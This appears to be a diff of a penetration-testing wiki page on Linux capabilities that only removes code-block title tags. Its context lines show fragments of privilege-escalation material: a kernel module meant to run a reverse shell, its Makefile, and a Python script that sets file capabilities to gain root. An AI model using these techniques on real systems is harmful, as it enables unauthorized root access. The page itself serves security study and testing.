@@ -189,7 +189,7 @@ cap_sys_admin,22,25          jrsysadmin
 
 Compiling the following program it's possible to **spawn a bash shell inside an environment that provides capabilities**.
 
-{% code title="ambient.c" %}
+
 ```c
 /*
  * Test program for the ambient capabilities
@@ -279,7 +279,7 @@ int main(int argc, char ** argv) {
   return 0;
 }
 ```
-{% endcode %}
+
 
 ```bash
 gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
@@ -690,7 +690,7 @@ Inside the previous output you can see that the **SYS\_MODULE** capability is en
 
 **Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:
 
-{% code title="reverse-shell.c" %}
+
 ```c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -714,9 +714,9 @@ static void __exit reverse_shell_exit(void) {
 module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
-{% endcode %}
 
-{% code title="Makefile" %}
+
+
 ```bash
 obj-m +=reverse-shell.o
 
@@ -726,7 +726,7 @@ all:
 clean:
     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
-{% endcode %}
+
 
 
 The blank char before each make word in the Makefile **must be a tab, not spaces**!
@@ -1265,7 +1265,7 @@ If **docker** is installed you could **impersonate** the **docker group** and ab
 
 If python has this **capability**, you can very easily abuse it to escalate privileges to root:
 
-{% code title="setcapability.py" %}
+
 ```python
 import ctypes, sys
 
@@ -1288,7 +1288,7 @@ status = libcap.cap_set_file(path,cap_t)
 if(status == 0):
     print (cap + " was successfully added to " + path)
 ```
-{% endcode %}
+
 
 ```bash
 python setcapability.py /usr/bin/python2.7
